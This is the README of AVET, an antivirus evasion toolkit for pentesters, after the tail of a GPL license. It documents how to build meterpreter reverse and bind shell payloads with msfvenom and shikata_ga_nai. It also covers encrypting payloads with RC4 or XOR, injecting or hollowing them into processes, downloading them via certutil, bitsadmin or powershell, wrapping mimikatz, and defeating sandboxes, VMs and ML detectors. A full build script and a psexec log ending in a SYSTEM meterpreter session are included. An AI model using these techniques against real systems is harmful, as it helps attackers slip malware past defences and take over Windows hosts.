16.\n\n  If the disclaimer of warranty and limitation of liability provided\nabove cannot be given local legal effect according to their terms,\nreviewing courts shall apply local law that most closely approximates\nan absolute waiver of all civil liability in connection with the\nProgram, unless a warranty or assumption of liability accompanies a\ncopy of the Program in return for a fee.\n\n                     END OF TERMS AND CONDITIONS\n\n            How to Apply These Terms to Your New Programs\n\n  If you develop a new program, and you want it to be of the greatest\npossible use to the public, the best way to achieve this is to make it\nfree software which everyone can redistribute and change under these terms.\n\n  To do so, attach the following notices to the program.  It is safest\nto attach them to the start of each source file to most effectively\nstate the exclusion of warranty; and each file should have at least\nthe \"copyright\" line and a pointer to where the full notice is found.\n\n    <one line to give the program's name and a brief idea of what it does.>\n    Copyright (C) <year>  <name of author>\n\n    This program is free software: you can redistribute it and/or modify\n    it under the terms of the GNU General Public License as published by\n    the Free Software Foundation, either version 3 of the License, or\n    (at your option) any later version.\n\n    This program is distributed in the hope that it will be useful,\n    but WITHOUT ANY WARRANTY; without even the implied warranty of\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n    GNU General Public License for more details.\n\n    You should have received a copy of the GNU General Public License\n    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\nAlso add information on how to contact you by electronic and paper mail.\n\n  If the program does terminal interaction, make it output a short\nnotice like this when it starts in an interactive mode:\n\n    <program>  Copyright (C) <year>  <name of author>\n    This program comes with ABSOLUTELY NO WARRANTY; for details type `show w'.\n    This is free software, and you are welcome to redistribute it\n    under certain conditions; type `show c' for details.\n\nThe hypothetical commands `show w' and `show c' should show the appropriate\nparts of the General Public License.  Of course, your program's commands\nmight be different; for a GUI interface, you would use an \"about box\".\n\n  You should also get your employer (if you work as a programmer) or school,\nif any, to sign a \"copyright disclaimer\" for the program, if necessary.\nFor more information on this, and how to apply and follow the GNU GPL, see\n<http://www.gnu.org/licenses/>.\n\n  The GNU General Public License does not permit incorporating your program\ninto proprietary programs.  If your program is a subroutine library, you\nmay consider it more useful to permit linking proprietary applications with\nthe library.  If this is what you want to do, use the GNU Lesser General\nPublic License instead of this License.  But first, please read\n<http://www.gnu.org/philosophy/why-not-lgpl.html>.\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 33.0419921875,
          "content": "# AntiVirus Evasion Tool\n\n\nAVET is an AntiVirus Evasion Tool, which was developed for making life easier for pentesters and for experimenting with antivirus evasion techniques, as well as other methods used by malicious software.\nFor an overview of new features in **v2.4**, as well as past version increments, have a look at the **CHANGELOG** file.\n\n\n## Table of Contents\n- [Installation](#installation)\n- [Docker](#docker)\n- [AVET the easy way](#avet-the-easy-way)\n- [AVET the normal way](#avet-the-normal-way)\n- <details><summary>Documentation (<i>click to expand</i>)</summary>\n\n  - [Data retrieval methods](#data-retrieval-methods)\n  - [Encryption and Encoding](#encryption-and-encoding)\n  - [Sandbox evasion](#sandbox-evasion)\n  - [Additional command execution](#additional-command-execution)\n  - [Helper tools](#helper-tools)\n  - [AVET & metasploit psexec](#avet-&-metasploit-psexec)\n  - [Adversarial Examples](#adversarial-examples)\n  </details>\n- [More](#more)\n\n\n### Some features\n- when running a .exe file made with msfpayload & co, the file will often be recognized by antivirus software\n- AVET is an antivirus evasion tool targeting windows machines with executable files\n- different kinds of input payloads can be used now: shellcode, exe and dlls\n- more techniques available: shellcode/dll injection, process hollowing and more\n- flexible retrieval methods for payload, decryption key, etc.\n- usage as a dropper\n- Chaining multiple iterations of AVET enables you to add multiple evasion layers, if necessary\n- combination of techniques: download your encrypted payload via powershell, while supplying the decryption key via command line argument at execution time, and finally inject your payload into another process, choosing from multiple techniques\n- basic sandbox checks\n- generation of adversarial examples against static detectors based on machine learning\n- execute all available build scripts with build_script_tester.py, might also be interesting for researchers for building a set of \"malicious\" samples using different evasion and injection techniques\n\n\n### Important Note\n\nNot all techniques will evade every AV engine. If one technique or build script does not work, please test another one.\nFeel free to experiment! After all this is a toolbox - yet you should wield the hammer yourself.\n\n## Installation\n\n__The Installtion Instruction applies for Kali 64bit and tdm-gcc!__\n\nYou can use the setup script:\n```bash\n./setup.sh\n```\n\nThis should automatically get you started by installing/configuring wine and installing tdm-gcc.\nYou'll shortly have to click through the tdm-gcc installer GUI though - standard settings should be fine.\nThe script will also ask if you want to install AVET's dependencies, which are needed to use some of the build scripts. The fetched dependencies will be put into separate folders next to the avet folder.\n\n\nDependencies will grab the latest releases of:\n- [pe_to_shellcode](https://github.com/hasherezade/pe_to_shellcode)\n- [mimikatz](https://github.com/gentilkiwi/mimikatz)\n- [DKMC](https://github.com/Mr-Un1k0d3r/DKMC)\n\n\nIf for whatever reason you want to install wine and tdm-gcc manually:\n- [How to install tdm-gcc with wine](https://govolution.wordpress.com/2017/02/04/using-tdm-gcc-with-kali-2/)\n\n## Docker\n\nIf you are not using Kali or don't want to install Metasploit on your system, you can use the Docker Container instead.\nThe container encapsulates Metasploit and avet and the samples will be created in your current directory.\nIt is also possible to use an graphical text editor like gedit.\n\nBuilding the container:\n```bash\nsudo docker build -t avet:v0.1 .\n```\nUsage:\n```bash\nsudo docker run -it --net=host --env=\"DISPLAY\" --volume=\"$HOME/.Xauthority:/root/.Xauthority:rw\" -v $(pwd):/tools/avet/output avet:v0.1 /bin/bash\n```\nFor a better experience it is recommend to alias this.\n```bash\n# In your .bash_profile, .bashrc or .bash_aliases\n\nalias avet='sudo docker run -it --net=host --env=\"DISPLAY\" --volume=\"$HOME/.Xauthority:/root/.Xauthority:rw\" -v $(pwd):/tools/avet/output avet /bin/bash'\n```\n\n\n## AVET the easy way\n\n**avet.py** is a small Python utility which was designed to assist you in using the tool.\n\nIt lists all scripts that are currently present in the build folder. After selecting one, you will be able to step through the script line by line, having the opportunity to modify the contents on the fly.\n\nThe latter is especially useful as you can define new LHOST and LPORT variables for msfvenom each time you run a build script via the fabric. \nYou can define default LHOST and LPORT values in the `/build/global_connect_config.sh` file, which are used if you don't redefine.\n\nThese modifications are temporary, which means that any changes you made will not persist in the build script on disk.\nThe modified version is executed once, and your executable built.\n\n<details>\n<summary>Here is a quick example (<i>Click to expand</i>):</summary>\n\n```\npython3 avet.py\n\n                       .|        ,       +\n             *         | |      ((             *\n                       |'|       `    ._____\n         +     ___    |  |   *        |.   |' .---\"|\n       _    .-'   '-. |  |     .--'|  ||   | _|    |\n    .-'|  _.|  |    ||   '-__  |   |  |    ||      |\n    |' | |.    |    ||       | |   |  |    ||      |\n ___|  '-'     '    \"\"       '-'   '-.'    '`      |____\njgs~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n\n\nWelcome to the avet Assistant!\n\n0 : build_40xshikata_revhttpsunstaged_win32.sh\n1 : build_50xshikata_quiet_revhttps_win32.sh\n2 : build_50xshikata_revhttps_win32.sh\n3 : build_asciimsf_fromcmd_revhttps_win32.sh\n4 : build_asciimsf_revhttps_win32.sh\n5 : build_avetenc_dynamicfromfile_revhttps_win32.sh\n6 : build_avetenc_fopen_revhttps_win32.sh\n7 : build_avetenc_mtrprtrxor_revhttps_win64.sh\n8 : build_calcfromcmd_50xshikata_revhttps_win32.sh\n9 : build_calcfrompowersh_50xshikata_revhttps_win32.sh\n10 : build_checkdomain_rc4_mimikatz.sh\n11 : build_cpucores_revhttps_win32.sh\n12 : build_disablewindefpsh_xorfromcmd_revhttps_win64.sh\n13 : build_dkmc_downloadexecshc_revhttps_win32.sh\n14 : build_downloadbitsadmin_mtrprtrxor_revhttps_win64.sh\n15 : build_downloadbitsadmin_revhttps_win32.sh\n16 : build_downloadcertutil_revhttps_win32.sh\n17 : build_downloadcurl_mtrprtrxor_revhttps_win64.sh\n18 : build_downloadiexplorer_revhttps_win32.sh\n19 : build_downloadpsh_revhttps_win32.sh\n20 : build_downloadsocket_mtrprtrxor_revhttps_win64.sh\n21 : build_downloadsocket_revhttps_win32.sh\n22 : build_dynamicfromfile_revhttps_win32.sh\n23 : build_fibonacci_rc4_mimikatz.sh\n24 : build_fopen_mtrprtrxor_revhttps_win64.sh\n25 : build_fopen_quiet_revhttps_win32.sh\n26 : build_fopen_revhttps_win32.sh\n27 : build_getchar_rc4_mimikatz.sh\n28 : build_gethostbyname_revhttps_win32.sh\n29 : build_hasvmkey_revhttps_win32.sh\n30 : build_hasvmmac_revtcp_win32.sh\n31 : build_hollowing_targetfromcmd_doubleenc_doubleev_revhttps_win64.sh\n32 : build_hollowing_targetfromcmd_doubleenc_doubleev_revtcp_win32.sh\n33 : build_injectdll_targetfromcmd_execcalc_downloadpsh_fopen_gethostbyname_win32.sh\n34 : build_injectdll_targetfromcmd_execcalc_downloadpsh_fopen_gethostbyname_win64.sh\n35 : build_injectshc_targetfromcmd_fopen_gethostbyname_xor_revhttps_win64.sh\n36 : build_injectshc_targetfromcmd_fopen_gethostbyname_xor_revtcp_win32.sh\n37 : build_kaspersky_fopen_shellrevtcp_win32.sh\n38 : build_mimikatz_pe2shc_xorfromcmd_win64.sh\n39 : build_pause_rc4_mimikatz.sh\n40 : build_rc4_interactive_pwsh_mimikatz_win64.sh\n41 : build_rc4_interactive_with_arithmetic_pwsh_mimikatz_win64.sh\n42 : build_rc4enc_mimikatz_win64.sh\n43 : build_sleep_rc4_mimikatz.sh\n44 : build_sleepbyping_rc4_mimikatz.sh\n45 : build_timedfibonacci_rc4_mimikatz.sh\n46 : buildsvc_20xshikata_bindtcp_win32.sh\n\nWhich Script would you like to configure and build?\nEnter the corresponding number -> 43\n\nDESCRIPTION :\n# RC4-encrypt the payload with a static, preset key.\n# Here, the mimikatz executable is used as payload, converted into shellcode format by pe_to_shellcode.\n# pe_to_shellcode is written by Hasherezade:\n# https://github.com/hasherezade/pe_to_shellcode\n\n# This script expects the Mimikatz executable to be at input/mimikatz.exe\n# and the pe_to_shellcode executable to reside in a folder parallel to avet: ../pe_to_shellcode/pe2shc.exe\n\nConfigure the Build Script\n\n# enable debug output\n-> enable_debug_print\n\n# generate key file with preset key\n-> generate_key preset aabbccdd1122\n\nDo you want to add sandbox evasions? [y/N]\n-> N\n\nExecutable will be created Shortly please wait.\n\n*** ============================================= ***\n\n         .==,_                                          \n        .===,_`\\\\                                        \n      .====,_ ` \\\\      .====,__                         \n---     .==-,`~. \\\\           `:`.__,                    \n ---      `~~=-.  \\\\           /^^^     MEEP MEEP        \n   ---       `~~=. \\\\         /                          \n                `~. \\\\       /                           \n                  ~. \\\\____./                            \n                    `.=====)                            \n                 ___.--~~~--.__                         \n       ___\\\\.--~~~              ~~~---.._|/              \n       ~~~\\\\\\\"                             /              \n\n ________  ___      ___ _____  __________  \n|\\   __  \\|\\  \\    /  /|\\  __\\ |\\___   __\\ \n\\ \\  \\|\\  \\ \\  \\  /  / | \\ \\__ \\|__|\\  \\_| \n \\ \\   __  \\ \\  \\/  / / \\ \\  _\\    \\ \\  \\  \n  \\ \\  \\ \\  \\ \\    / /   \\ \\ \\___   \\ \\  \\ \n   \\ \\__\\ \\__\\ \\__/ /     \\ \\____\\   \\ \\__\\\n    \\|__|\\|__|\\|__|/       \\|_____|   \\|__|\n\n*** ============================================= ***\n\nReading module from: input/mimikatz.exe\n[WARNING] This is a console application! The recommended subsystem is GUI.\n[+] Saved as: input/sc_raw.txt\nStarting RC4 encoder...\nReading payload from file input/sc_raw.txt, expecting raw format.\npayload size in bytes is 1309884\nReading key from file input/key_raw.txt, expecting raw format.\nKey length in bytes is 6\nApplying RC4 algorithm\nWriting payload to file input/sc_enc_raw.txt\n\n# The decryption key is aabbccddee if it has not been changed.\n# You need to provide the decryption key as 2nd command line argument.\n# Call generated executable on target like:\n# $ rc4enc_mimikatz_win64.exe [your mimikatz arguments, probably 'coffee']  [decryption key]\n\n\nYour executable should be in the output folder!\n```\n</details>\n\n## AVET the normal way\n\nOf course it is possible to run all commands step by step from command line. However, in the \"build\" folder you will find preconfigured build scripts for relevant use cases. \nThe build scripts themselves are written so as they have to be called from within the avet directory:\n```bash\nkali@kali:~/tools/avet$ ./build/build_fopen_mtrprtrxor_revhttps_win64.sh\n```\n\nYou can define default LHOST and LPORT values for metasploit payloads in the `/build/global_connect_config.sh` file, which are used if you don't redefine.\n\n\n### Usage examples\n\nGenerate a 32-bit process hollowing executable in two steps (as in build_hollowing_targetfromcmd_doubleenc_doubleev_revhttps_win32.sh):\n\nFirst, generate the hollowing payload with AVET:\n- generate meterpreter/reverse_https 32-bit shellcode\n- the meterpreter shellcode will be XOR encrypted with a 5-byte preset key\n- the shellcode will be compiled into the generated executable\n- fopen and gethostbyname sandbox evasion environmental checks will be made before executing the shellcode\n\t\nSecond, build the \"dropper\" executable that delivers the first step payload via hollowing:\n- statically compile the first step payload into the executable\n- the payload will be XOR encrypted with a different 5-byte preset key\n- again, fopen and gethostbyname sandbox evasion environmental checks will be made before hollowing\n- the hollowing target PID will be delivered via command line argument on execution time\n\t\nSo you get a two-layer environmental-checked and encrypted meterpreter payload, hollowed into a process of your choice.\nWhile the settings in the build script are mostly for demonstration purposes, there is a lot of flexibility to customize your generated executable by making simple modifications to the build script.\n\nYou could switch out data retrieval methods: Instead of statically compiling most data into the executable, you could download your hollowing payload via powershell, download the decryption key via sockets, use different encryption or environmental checks, etc.\n\nOr try to add more evasion layers by doing a third build iteration.\nOr switch out the payload. Want to use Mimikatz instead? Convert it into shellcode via https://github.com/hasherezade/pe_to_shellcode, and change the payload in the build script.\n\nOf course, you can also design more minimalistic builds, like executing unencrypted shellcode with only one environmental check, or maybe 50 iterations of shikata are enough to reach your goal?\nChoose/modify the build scripts, suiting your needs.\n\n\n### Build scripts\n\nBelow, find a list of all currently shipped build scripts. The names should hint at each script's functionality.\nFor detailed information, consider the comments inside the scripts.\nFeel free to modify/write your own build scripts to build your custom executable!\n\n<details>\n<summary><i>Click to expand</i></summary>\n\n  ```\n  build_40xshikata_revhttpsunstaged_win32.sh\n  build_50xshikata_revhttps_win32.sh\n  build_50xshikata_quiet_revhttps_win32.sh\n  build_asciimsf_fromcmd_revhttps_win32.sh\n  build_asciimsf_revhttps_win32.sh\n  build_avetenc_dynamicfromfile_revhttps_win32.sh\n  build_avetenc_fopen_revhttps_win32.sh\n  build_avetenc_mtrprtrxor_revhttps_win64.sh\n  build_calcfromcmd_50xshikata_revhttps_win32.sh\n  build_calcfrompowersh_50xshikata_revhttps_win32.sh\n  build_cpucores_revhttps_win32.sh\n  build_checkdomain_rc4_mimikatz.sh\n  build_disablewindefpsh_xorfromcmd_revhttps_win64.sh\n  build_dkmc_downloadexecshc_revhttps_win32.sh\n  build_downloadbitsadmin_mtrprtrxor_revhttps_win64.sh\n  build_downloadbitsadmin_revhttps_win32.sh\n  build_downloadcertutil_revhttps_win32.sh\n  build_downloadcurl_mtrprtrxor_revhttps_win64.sh\n  build_downloadiexplorer_revhttps_win32.sh\n  build_downloadpsh_revhttps_win32.sh\n  build_downloadsocket_mtrprtrxor_revhttps_win64.sh\n  build_downloadsocket_revhttps_win32.sh\n  build_dynamicfromfile_revhttps_win32.sh\n  build_fibonacci_rc4_mimikatz.sh\n  build_fopen_mtrprtrxor_revhttps_win64.sh\n  build_fopen_quiet_revhttps_win32.sh\n  build_fopen_revhttps_win32.sh\n  build_getchar_rc4_mimikatz.sh\n  build_gethostbyname_revhttps_win32.sh\n  build_hasvmkey_revhttps_win32.sh\n  build_hasvmmac_revtcp_win32.sh\n  build_hollowing_targetfromcmd_doubleenc_doubleev_revhttps_win64.sh\n  build_hollowing_targetfromcmd_doubleenc_doubleev_revtcp_win32.sh\n  build_injectdll_targetfromcmd_execcalc_downloadpsh_fopen_gethostbyname_win32.sh\n  build_injectdll_targetfromcmd_execcalc_downloadpsh_fopen_gethostbyname_win64.sh\n  build_injectshc_targetfromcmd_fopen_gethostbyname_xor_revhttps_win64.sh\n  build_injectshc_targetfromcmd_fopen_gethostbyname_xor_revtcp_win32.sh\n  build_kaspersky_fopen_shellrevtcp_win32.sh\n  build_mimikatz_pe2shc_xorfromcmd_win64.sh\n  build_pause_rc4_mimikatz.sh\n  build_rc4_interactive_pwsh_mimikatz_win64.sh\n  build_rc4_interactive_with_arithmetic_pwsh_mimikatz_win64.sh\n  build_rc4enc_mimikatz_win64.sh\n  build_sleep_rc4_mimikatz.sh\n  build_sleepbyping_rc4_mimikatz.sh\n  build_timedfibonacci_rc4_mimikatz.sh\n  buildsvc_20xshikata_bindtcp_win32.sh\n  ```\n</details>\n\n\n## Documentation\n\n### Data retrieval methods\nThese methods are compatible with all of AVET's data sources and can be used as such in the build script.\n\nA few examples:\n```\n# Compiles the command 'calc.exe' statically into the executable, which will then be executed via cmd at sample startup.\nset_command_source static_from_here 'calc.exe'\nset_command_exec exec_via_cmd\n\n# Download 64-bit shellcode via powershell, and execute. \nset_payload_source download_powershell\nset_payload_execution_method exec_shellcode64\n\n# Download XOR decryption key into memory. (Server to download from is always specified via first command line argument on execution). Decode the payload.\nset_key_source download_socket\nset_decoder xor\n\n# Retrieves the tuple (target PID, dll path) from command line on execution\nset_payload_info_source from_command_line_raw\nset_payload_execution_method inject_dll\n```\nIf features are skipped/not used, you have to specify NOP-like behavior instead:\n```\nset_command_source no_data\nset_command_exec no_command\n```\n\n#### static_from_file\nThe data is retrieved from a file and is statically compiled into the generated executable.\nFor this to work, the data must be provided as a c-style array at compilation time, like\n```\nunsigned char buf[] = \"\\x00\\x11\\x22\\x33\";\n```\n\n#### static_from_here\nThe data is statically compiled into the generated executable,\nretrieved from the specified argument in the build script.\n\n#### dynamic_from_file\nThe data is read from a file at run time.\n\n#### from_command_line_hex\nRetrieves data from a \"11aabb22..\" format hex string (from the command line).\n\n#### from_command_line_raw\nRetrieves data from a command line argument. The given ASCII string is interpreted as raw byte data.\n\n#### download_certutil\nDownloads data from a specified URI, using ```certutil.exe -urlcache -split -f```.\nDrops the downloaded file to disk before reading the data.\n\n#### download_curl\nDownloads the data using curl.\nDrops the downloaded file to disk before reading the data.\n\n#### download_internet_explorer\nDownloads data from a specified URL, using Internet Explorer.\nDrops the downloaded file to disk before reading the data.\n\n#### download_powershell\nDownloads data from a specified URI via powershell.\nDrops the downloaded file to disk before reading the data.\n\n#### download_socket\nDownloads the data from a specified URI, using sockets.\nData is read directly into memory, no file is dropped to disk.\n\n#### download_bitsadmin\nDownloads the data using the BITSAdmin Windows utility.\nDrops the downloaded file to disk before reading the data.\n\n\n### Payload execution methods\nHow to execute/deliver the payload. The injection/hollowing methods require additional information about the injection target, which can be given via ```set_payload_info_source <the_info>``` (see data retrieval methods).\n\n#### exec_shellcode\nExecutes 32-bit shellcode with a C function binding.\n\n#### exec_shellcode64\nExecutes 64-bit shellcode with a C function binding and VirtualProtect.\n\n#### exec_shellcode_ASCIIMSF\nExecutes ASCIIMSF encoded shellcode via ```call eax```.\n\n#### hollowing32\nInstanciates a new process, cuts out the original image and hollows the given payload into the new process.\nThe payload is a 32-bit executable image. Works on 32-bit targets.\n\n#### hollowing64\nSame as hollowing32, but using 64-bit PE payloads for 64-bit target processes.\n\n#### inject_dll\nInjects a dll into a target process, using ```CreateRemoteThread```.\nInjection works for 32-bit payloads into 32-bit processes, and 64-bit payloads into 64-bit processes, respectively.\n\n#### inject_shellcode\nInjects shellcode into a target process, using ```CreateRemoteThread```.\nInjection works for 32-bit shellcode into 32-bit processes, and 64-bit shellcode into 64-bit processes, respectively.\n\n\n### Encryption and Encoding\nAVET provides encoders for each scheme, which can be applied on the payload before compilation/delivery.\nOn execution, the specified decoder then again deobfuscates the payload at runtime.\n\nHere is an RC4 example, where the decryption key is retrieved from the command line in hex format at execution time:\n```\ngenerate_key preset aabbccddee input/key_raw.txt\nencode_payload rc4 input/shellcode_raw.txt input/shellcode_enc_raw.txt input/key_raw.txt\nset_key_source from_command_line_hex\nset_decoder rc4\n```\n\nYou can also skip the encoding feature by not further encoding the shellcode, and setting:\n```\nset_key_source no_data\nset_decoder none\n```\n\n#### xor\nRolling XOR, supporting multi-byte keys.\n\n#### avet\nCustom encoding, reinterpreting the ASCII format.\n\n#### rc4\nRC4 encryption/decryption, with flexible key length.\n\n\n### Debugger and Sandbox evasion\nThese are environmental checks that are performed before eventual encoding and payload execution.\nIf an unpleasant execution environment is detected (e.g. an AV sandbox), execution stops.\n\nCurrently, you can arbitrarily queue up to 10 checks. Using the same technique multiple times is supported.\nThe queue limit *EVASION_ARRAY_SIZE* can however be easily modified in *avet.c*.\n\n#### is debugger present\nCheck with isDebuggerPresent() function if a debugger is present.\nExit if true.\n```\nadd_evasion is_debugger_present\n```\n\n#### sleep\nSleep for certain time before execution. The duration(in Seconds) can be specified in the build script, like\n\n```\n# sleep for 3 seconds\nadd_evasion evasion_by_sleep 3\n```\n\n#### sleep by ping\nHalt execution of the program for specified seconds by invoking a timed ping command against localhost.\nThe program pings once each second.\n```\nadd_evasion sleep_by_ping 4\n```\n\n#### check fast forwarding\nCheck if sandbox utilize fast forwarding to reduce heuristic check time. Local time and sleep is used.\n```\nadd_evasion check_fast_forwarding\n```\n\n#### get tickcount\nCheck if sandbox utilize fast forwarding to reduce heuristic check time. Uptime and sleep is used.\n```\nadd_evasion get_tickcount\n```\n\n#### Username\nGet username and compare with given username. Exit if it does not match.\n\n```\nadd_evasion has_username 'IEUser'\n```\n\n#### Messagebox\nSpawn simple Messagebox before execution. If Arithmetic is not solved correctly, the program exits.\n```\nadd_evasion interaction_msg_box\n```\n\n#### getchar\nWait until input is delivered using getchar.\n```\nadd_evasion interaction_getchar\n```\n\n#### system pause\nExecute system(\"pause\"), causing the spawned cmd (and our main process) to wait for any keypress.\n```\nadd_evasion interaction_system_pause\n```\n\n#### fopen\nChecks for the existence of a file. If not found, stop execution.\nThe file name can be specified in the build script, like\n```\nadd_evasion fopen_sandbox_evasion 'c:\\\\windows\\\\system.ini'\n```\n\n#### bios info\nChecks if it is possible to fetch SMBIOS firmware table. Stop execution if not.\n\n```\nadd_evasion get_bios_info\n```\n\n#### gethostbyname\nTry to resolve a hostname of your choice. If gethostbyname returns unequals NULL, stop execution.\nThe hostname to check against can be specified in the build script, like\n```\nadd_evasion gethostbyname_sandbox_evasion 'testdomain.com'\n```\n\n#### get_cpu_cores\nChecks number of CPU cores on the target. If the number is lower than the specified value, stop execution.\n```\nadd_evasion get_cpu_cores 2\n```\n\n#### has_vm_mac\nChecks for vendor-specific MAC prefixes. If any identified, stop execution.\n```\nadd_evasion has_vm_mac\n```\n\n#### has_vm_regkey\nChecks for vendor-specific registry keys. If any identified, stop execution.\n```\nadd_evasion has_vm_regkey\n```\n\n#### hide_console\nNot really an evasion technique, but hides your console window ;)\n```\nadd_evasion hide_console\n```\n\n#### Installation Date\nFetch Installation date of Windows and compare it to the specified one. If the dates do not match, stop execution. The date needs to be specified in format dd/mm/yyyy.\n\n```\nadd_evasion get_install_date '24/11/2007'\n```\n\n#### Number of Processes\nCount the number of running Processes. If the number of the processes is smaller than given threshold, stop execution.\n\n```\nadd_evasion get_num_processes 50\n```\n\n#### Standard Browser\nRead Registry Key to get the default Browser. If the Browser does not match with given value, stop execution. Possible values are  MSEdgeHTM, Firefox or ChromeHTML.\n\n```\nadd_evasion get_standard_browser 'Firefox'\n```\n\n#### Domain\nQueries the DNS domain the target is in.\nIf the target is not in the expected domain as specified, the program exits.\n```\nadd_evasion get_computer_domain 'domain.com'\n```\n\n#### Computation\nFibonacci\n\nCompute specified iterations of the Fibonacci series.\nWill likely produce false results for greater n due to integer boundaries.\n```\n# 10 iterations\nadd_evasion computation_fibonacci 10\n```\n\nTimed Fibonacci\n\nStops Fibonacci computations after approximately specified seconds.\n```\n# Stops computation after 20 seconds\nadd_evasion computation_timed_fibonacci 20\n```\n\n\n#### Folders and more\nCheck if Artifact exists, stop execution if not. Paths must be in Unix style.\n\nBackground wallpaper:\n```\nadd_evasion has_background_wp\n```\n\n\nCheck for folder:\n```\nadd_evasion has_folder 'C:/Users/user/Downloads/'\n```\n\nCheck for Public Desktop:\n```\nadd_evasion has_public_desktop\n```\n\nCheck for Recycle Bin\n```\nadd_evasion has_recycle_bin\n```\n\nCheck for recent file folder\n```\nadd_evasion has_recent_files\n```\n\nCheck for network drive\n```\nadd_evasion has_network_drive\n```\n\n\n### Additional command execution\nGrants you the ability to execute an additional cmd/powershell payload directly after the eventual sandbox evasion functions.\nThe payload source is compatible with AVET's data retrieval methods.\n\nThe following example downloads a powershell payload via BITSAdmin: \n```\nset_command_source download_bitsadmin\nset_command_exec exec_via_powershell\n```\n\n\n### Helper tools\n\n#### data_raw_to_c\nTakes raw data as input from a file, converts it into C-array format and writes output to another file.\nThis aids in providing the correct format for the static_from_file data retrieval method.\n\n#### generate_key\nKey generation utility. Generates either a (non-cryptographically) random key or takes a preset key as input,\nand outputs the raw key data into a specified file.\nThis aids in providing key material for the AVET encryption feature.\n\n#### sh_format\nUtility from AVET 1.3 that performs AVET encoding.\n\n\n## AVET & metasploit psexec\n\nAVET is compatible to metasploit's psexec module. For that, the generated executable needs to be compiled as a Windows Service, which is implemented by using *avetsvc.c*. Consider the corresponding example build script\n\n*build_svc_20xshikata_bindtcp_win32.sh*:\n\n```\n#!/bin/bash          \n# Designed for use with msf psexec module!\n\n# print AVET logo\ncat banner.txt\n\n# include script containing the compiler var $win32_compiler\n# you can edit the compiler in build/global_win32.sh\n# or enter $win32_compiler=\"mycompiler\" here\n. build/global_win32.sh\n\n# import global default lhost and lport values from build/global_connect_config.sh\n. build/global_connect_config.sh\n\n# override connect-back settings here, if necessary\nLPORT=$GLOBAL_LPORT\n\n# make meterpreter bind payload, encoded 20 rounds with shikata_ga_nai\nmsfvenom -p windows/meterpreter/bind_tcp lport=$LPORT -e x86/shikata_ga_nai -i 20 -f raw -a x86 --platform Windows > input/sc_raw.txt\n\n# import feature construction interface\n. build/feature_construction.sh\n\n# add evasion techniques\nadd_evasion fopen_sandbox_evasion 'c:\\\\windows\\\\system.ini'\nadd_evasion gethostbyname_sandbox_evasion 'this.that'\n\n# generate key file\ngenerate_key preset aabbcc12de input/key_raw.txt\n\n# encode shellcode\nencode_payload xor input/sc_raw.txt input/scenc_raw.txt input/key_raw.txt\n\n# array name buf is expected by static_from_file retrieval method\n./tools/data_raw_to_c/data_raw_to_c input/scenc_raw.txt input/scenc_c.txt buf\n\n# no command preexec\nset_command_source no_data\nset_command_exec no_command\n\n# set shellcode source\nset_payload_source static_from_file input/scenc_c.txt\n\n# convert generated key from raw to C into array \"key\"\n./tools/data_raw_to_c/data_raw_to_c input/key_raw.txt input/key_c.txt key\n\n# set key source\nset_key_source static_from_file input/key_c.txt\n\n# set payload info source\nset_payload_info_source no_data\n\n# set decoder\nset_decoder xor\n\n# set shellcode binding technique\nset_payload_execution_method exec_shellcode\n\n# enable debug printing\nenable_debug_print to_file C:/avetdbg.txt\n\n# compile as service\n$win32_compiler -o output/service.exe source/avetsvc.c -lws2_32\nstrip output/service.exe\n\n# cleanup\ncleanup_techniques\n```\n\nAnd on the metasploit side:\n```\nmsf exploit(psexec) > use exploit/windows/smb/psexec\nmsf exploit(psexec) > set EXE::custom /root/tools/ave/pwn.exe\nEXE::custom => /root/tools/ave/pwn.exe\nmsf exploit(psexec) > set payload windows/meterpreter/bind_tcp\npayload => windows/meterpreter/bind_tcp\nmsf exploit(psexec) > set rhost 192.168.116.183\nrhost => 192.168.116.183\nmsf exploit(psexec) > set smbuser dax\nsmbuser => dax\nmsf exploit(psexec) > set smbpass test123\nsmbpass => test123\nmsf exploit(psexec) > set lport 8443\nlport => 8443\nmsf exploit(psexec) > run\n\n[*] 192.168.116.183:445 - Connecting to the server...\n[*] Started bind handler\n[*] 192.168.116.183:445 - Authenticating to 192.168.116.183:445 as user 'dax'...\n[*] Sending stage (957487 bytes) to 192.168.116.183\n[*] 192.168.116.183:445 - Selecting native target\n[*] 192.168.116.183:445 - Uploading payload...\n[*] 192.168.116.183:445 - Using custom payload /root/tools/avepoc/a.exe, RHOST and RPORT settings will be ignored!\n[*] 192.168.116.183:445 - Created \\mzrCIOVg.exe...\n[+] 192.168.116.183:445 - Service started successfully...\n[*] 192.168.116.183:445 - Deleting \\mzrCIOVg.exe...\n[-] 192.168.116.183:445 - Delete of \\mzrCIOVg.exe failed: The server responded with error: STATUS_CANNOT_DELETE (Command=6 WordCount=0)\n[*] Exploit completed, but no session was created.\nmsf exploit(psexec) > [*] Meterpreter session 4 opened (192.168.116.142:33453 -> 192.168.116.183:8443) at 2017-05-27 18:47:23 +0200\n\nmsf exploit(psexec) > sessions\n\nActive sessions\n===============\n\nId Type Information Connection\n-- ---- ----------- ----------\n4 meterpreter x86/windows NT-AUTORIT_T\\SYSTEM @ DAX-RYMZ48Z3EYO 192.168.116.142:33453 -> 192.168.116.183:8443 (192.168.116.183)\n\nmsf exploit(psexec) > sessions -i 4\n[*] Starting interaction with 4...\n\nmeterpreter > sysinfo\nComputer : DAX-RYMZ48Z3EYO\nOS : Windows XP (Build 2600, Service Pack 3).\nArchitecture : x86\nSystem Language : de_DE\nDomain : ARBEITSGRUPPE\nLogged On Users : 2\nMeterpreter : x86/windows\n```\n## Adversarial Examples\nAdversarial examples are specifically crafted inputs with the purpose of leading machine learning models to misclassification.\n\nTo use this method, please create a virtual environment and install the needed dependencies from `requirements.txt`.\n\n### Practical Manipulations\nFive functionality-preserving manipulations for PE files are available:\n\n![Practical Manipulations](images/pm.png)\n\nTo apply the practical manipulation to the malware with random bytes injected, use the `gen_adversarial_exe` command followed by name of the practical manipulation and the path to the file as parameters.\nAvailable manipulations are `full_dos`, `extend`, `shift`, `padding`, `section_injection`.\n\nFor example:\n```sh\ngen_adversarial_exe section_injection output/rc4enc_mimikatz_adversarial_win64.exe\n```\n\n### Genetic Optimizing\nInstead of injecting random content, it is possible to optimize the content, to achieve higher probability of evasion.\nThe optimizer extracts benign sections from goodware and uses a genetic algorithm to optimize the 